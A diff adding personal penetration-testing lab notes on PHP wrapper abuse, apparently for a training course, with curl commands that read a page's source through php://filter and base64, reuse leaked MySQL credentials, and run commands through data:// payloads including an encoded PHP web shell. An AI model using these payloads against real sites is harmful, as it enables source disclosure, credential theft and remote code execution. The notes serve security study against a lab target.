@@ -120,6 +120,34 @@ Lab notes
 sometimes sudo -I will give you root if the account has the correct permissions
 
 ### 9.2.2. PHP Wrappers
+We can use the php://filter wrapper to display the contents of files either with or without encodings like ROT134 or Base64.
+
+curl http://mountaindesserts.com/meteor/index.php?page=admin.php
+
+Use filter to try to get more info
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+
+They realised that the page looks incomplete (missing body tag), thus they try encoding the output this time
+
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+
+This output some text in base64, you can decode using 
+echo "base64nonsense" | base64 -d
+-d: decode
+
+This provided mysql creds -- use those creds to either connect to the database or to try to log into a user account via ssh
+
+php filter wrapper can be used to include contents of a file, but data:// can be used for RCE -- an alternative method when we cannot poison a local file with PHP code
+
+php data wrapper example
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+
+encoded php data wrapper example 
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+
+
 
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
@@ -128,7 +156,13 @@ sometimes sudo -I will give you root if the account has the correct permissions
 Extra Reading   
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 9.2.2. PHP Wrappers
-
+https://www.php.net/manual/en/wrappers.php.php
+https://www.php.net/manual/en/wrappers.data.php
+https://www.php.net/manual/en/wrappers.php
+https://www.php.net/manual/en/function.str-rot13.php
+https://en.wikipedia.org/wiki/Base64
+https://www.mysql.com/
+https://www.php.net/manual/en/filesystem.configuration.php
 
 9.2.1. Local File Inclusion (LFI)
 https://owasp.org/www-community/attacks/Log_Injection
